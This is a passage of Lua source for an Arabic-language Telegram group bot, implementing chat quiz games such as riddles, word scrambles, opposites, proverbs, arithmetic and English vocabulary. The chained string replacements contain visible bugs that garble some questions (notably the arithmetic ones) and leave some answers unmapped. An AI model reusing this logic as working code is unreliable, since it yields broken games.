name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
DavidTEAM = '⌁︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
DavidTEAM = '⌁︙اول واحد يرتبها يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ ترتيب للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevAbs:set(David.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

⌁︙اختر رقم لاستخراج المحيبس
⌁︙الفائز يحصل على (5) نقاط
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbs:setex(David.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
DavidTEAM = '⌁︙اول واحد يحلها يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ حزوره للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum2'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
DavidTEAM = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum2'..msg.chat_id_) and not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المعاني للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum3'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
DavidTEAM = '⌁︙ما هو عكس كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum3'..msg.chat_id_) and not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ العكس للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum4'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
DavidTEAM = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum4'..msg.chat_id_) and not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المختلف للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum5'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
DavidTEAM = '⌁︙اكمل المثال التالي ↫ ['..name..']'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum5'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(David..'Abs:GameNum5'..msg.chat_id_)
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ امثله للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum6'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
DavidTEAM = '⌁︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum6'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(David..'Abs:GameNum6'..msg.chat_id_)
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ رياضيات للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum7'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
DavidTEAM = '⌁︙ما معنى كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum7'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(David..'Abs:GameNum7'..msg.chat_id_)
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ انكليزيه للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
end
